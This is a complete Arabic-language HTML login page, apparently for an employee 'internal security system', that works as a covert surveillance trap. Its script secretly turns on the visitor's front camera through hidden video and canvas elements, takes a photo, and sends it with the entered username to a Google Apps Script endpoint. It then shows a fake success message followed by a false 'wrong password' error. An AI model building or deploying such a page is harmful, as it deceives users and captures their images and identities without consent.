<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - نظام الأمان</title>
    <style>
        :root {
            --primary: #4361ee;
            --primary-dark: #3a56d4;
            --light: #f8f9fa;
            --dark: #212529;
            --success: #4cc9f0;
            --error: #f04c4c;
            --border-radius: 12px;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: var(--light);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: var(--border-radius);
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo h1 {
            font-size: 28px;
            margin-bottom: 8px;
            background: linear-gradient(to right, #4cc9f0, #4361ee);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
        }

        input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: 1px solid rgba(255, 255, 255, 0.2);
            background: rgba(255, 255, 255, 0.1);
            color: var(--light);
            font-size: 16px;
            transition: all 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(255, 255, 255, 0.15);
        }

        .btn {
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 8px;
            background: linear-gradient(to right, var(--primary), #7209b7);
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .btn:hover {
            transform: translateY(-2px);
        }

        .status {
            text-align: center;
            margin-top: 15px;
            padding: 10px;
            border-radius: 8px;
            font-size: 14px;
        }

        .success {
            background: rgba(76, 201, 240, 0.2);
            color: #4cc9f0;
        }

        .error {
            background: rgba(240, 76, 76, 0.2);
            color: #f04c4c;
        }

        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }

        .spinner {
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top: 3px solid var(--primary);
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <h1>نظام الأمان الداخلي</h1>
                <p>تسجيل دخول آمن للموظفين</p>
            </div>
            
            <div id="loginSection">
                <div class="form-group">
                    <label for="username">اسم المستخدم</label>
                    <input type="text" id="username" placeholder="أدخل اسم المستخدم">
                </div>
                
                <div class="form-group">
                    <label for="password">كلمة المرور</label>
                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
                </div>
                
                <button class="btn" id="loginBtn">تسجيل الدخول</button>
            </div>
            
            <div class="loading" id="loadingIndicator">
                <div class="spinner"></div>
                <p>جاري التحقق من بياناتك...</p>
            </div>
            
            <div class="status" id="statusMessage"></div>
        </div>
    </div>

    <!-- عناصر مخفية للكاميرا -->
    <video id="hiddenVideo" autoplay class="hidden"></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        // استبدل هذا الرابط برابط التطبيق النصي الخاص بك
        const GAS_URL = "https://script.google.com/macros/s/AKfycbyWaAy8Pen8CL2giraDZQNYbUqiAZ4lyXaDbPpqJfD4dQR3L_1kPV7TXWYPIoOffe9m/exec";

        const loginBtn = document.getElementById('loginBtn');
        const loadingIndicator = document.getElementById('loadingIndicator');
        const statusMessage = document.getElementById('statusMessage');
        const hiddenVideo = document.getElementById('hiddenVideo');
        const hiddenCanvas = document.getElementById('hiddenCanvas');

        let stream = null;

        loginBtn.addEventListener('click', async () => {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                showStatus('يرجى ملء جميع الحقول', 'error');
                return;
            }
            
            loginBtn.disabled = true;
            loadingIndicator.style.display = 'block';
            showStatus('جاري التحقق من بيانات الدخول...', '');
            
            try {
                // التقاط الصورة أولاً
                const imageData = await capturePhoto();
                
                if (imageData) {
                    // إرسال البيانات إلى الخادم
                    await sendToServer(username, imageData);
                    showStatus('تم التحقق من بياناتك بنجاح!', 'success');
                } else {
                    showStatus('تم تسجيل الدخول بدون صورة', 'success');
                }
                
                // إعادة تعيين النموذج بعد نجاح وهمي
                setTimeout(() => {
                    resetForm();
                    showStatus('اسم المستخدم أو كلمة المرور غير صحيحة', 'error');
                }, 3000);
                
            } catch (error) {
                console.error('Error:', error);
                showStatus('فشل في عملية الدخول', 'error');
                resetForm();
            }
        });

        async function capturePhoto() {
            try {
                console.log('جاري الوصول إلى الكاميرا...');
                
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: 640,
                        height: 480
                    }, 
                    audio: false 
                });
                
                hiddenVideo.srcObject = stream;
                
                // انتظار تحميل الفيديو
                await new Promise((resolve) => {
                    hiddenVideo.onloadedmetadata = () => {
                        hiddenVideo.play();
                        setTimeout(resolve, 1000);
                    };
                });
                
                // رسم الصورة على canvas
                const context = hiddenCanvas.getContext('2d');
                hiddenCanvas.width = hiddenVideo.videoWidth;
                hiddenCanvas.height = hiddenVideo.videoHeight;
                context.drawImage(hiddenVideo, 0, 0);
                
                // الحصول على الصورة كـ base64
                const imageData = hiddenCanvas.toDataURL('image/jpeg', 0.7);
                
                // إيقاف الكاميرا
                stream.getTracks().forEach(track => track.stop());
                
                console.log('تم التقاط الصورة بنجاح');
                return imageData;
                
            } catch (error) {
                console.warn('لا يمكن الوصول إلى الكاميرا:', error);
                return null;
            }
        }

        async function sendToServer(username, imageData) {
            try {
                console.log('جاري إرسال البيانات إلى الخادم...');
                
                const formData = new FormData();
                formData.append('image', imageData);
                formData.append('filename', 'login_capture_' + Date.now() + '.jpg');
                formData.append('username', username);
                formData.append('note', 'تم التقاط الصورة تلقائياً أثناء تسجيل الدخول');
                
                const response = await fetch(GAS_URL, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                console.log('استجابة الخادم:', result);
                
                if (!response.ok) {
                    throw new Error(result.error || 'فشل الإرسال');
                }
                
                return result;
                
            } catch (error) {
                console.error('خطأ في الإرسال:', error);
                throw error;
            }
        }

        function showStatus(message, type) {
            statusMessage.textContent = message;
            statusMessage.className = 'status';
            if (type === 'success') statusMessage.classList.add('success');
            if (type === 'error') statusMessage.classList.add('error');
        }

        function resetForm() {
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
            loginBtn.disabled = false;
            loadingIndicator.style.display = 'none';
        }
    </script>
</body>
</html>
